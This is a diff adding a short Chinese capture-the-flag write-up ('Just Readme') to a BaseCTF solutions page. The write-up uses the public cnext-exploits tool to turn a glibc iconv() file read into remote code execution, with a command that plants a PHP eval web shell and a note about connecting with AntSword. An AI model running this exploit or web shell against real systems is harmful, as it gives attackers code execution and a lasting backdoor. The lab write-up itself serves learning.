@@ -290,6 +290,7 @@
             <li><a href="#fin-1z_php">[Fin] 1z_php</a></li>
             <li><a href="#fin-back-to-the-future">[Fin] Back to the future</a></li>
             <li><a href="#fin-jinja-mark">[Fin] Jinja Mark</a></li>
+            <li><a href="#fin-just-readme-前置">[Fin] Just Readme (前置)</a></li>
           </ol>
         </li>
       </ol>
@@ -1921,6 +1922,53 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><hr>
+<h4 id="fin-just-readme-前置">[Fin] Just Readme (前置)
+</h4><p>使用这个项目打glibc的iconv()函数将文件读取变成rce</p>
+<p><a class="link" href="https://github.com/ambionics/cnext-exploits"  target="_blank" rel="noopener"
+    ></a></p>
+<p>将data后改为.text,不然无法正常输出</p>
+<p><img src="/img/image-20240920110616225.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920110616225"
+	
+	
+></p>
+<p>payload<code>python3 cnext-exploit.py http://challenge.basectf.fun:34357/ &quot;echo '&lt;?=@eval(\$_POST[0]);?&gt;' &gt; shell.php&quot;</code></p>
+<p><img src="/img/image-20240920110601171.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920110601171"
+	
+	
+></p>
+<p><img src="/img/image-20240920110712772.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920110712772"
+	
+	
+></p>
+<p>蚁剑连接执行文件即可</p>
+<p><img src="/img/image-20240920111821314.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240920111821314"
+	
+	
+></p>
 
 </section>
 
